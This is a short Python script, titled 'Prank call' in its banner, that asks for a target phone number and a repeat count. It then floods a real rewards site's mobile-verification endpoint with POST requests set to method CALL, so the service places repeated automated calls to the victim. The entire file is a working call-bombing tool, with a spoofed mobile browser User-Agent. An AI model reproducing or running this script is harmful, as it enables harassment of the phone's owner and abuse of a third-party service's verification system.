import os,sys,time,requests

logo = """
               Prank call

          ▄▄▄▄─●●─▄▄▄─▄▄─▄▄▄▄▄▄
          ─██──██──██▄█───██▄─█
          ─██──██─▄██─██▄─██
          ▄██▄█──────────▄██▄▄█

[+]===================================[+]
|          Kreator : Kohakuツ           |
|        IG : ahmad_muzakkhi_135        |
[+]===================================[+]
"""

time.sleep(1)
os.system("clear")
print(logo)
print(" Example (87866xxxxxx)")
nomor = input(" Nomor Target > ")
jumlah = int(input(" jumlah > "))
time.sleep(1)

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host' : "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1915) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(int(jumlah)):
	send = requests.post(url+nomor, headers=ua, data=dat)
	print(" [-] Status >",(send.json()["message"]))

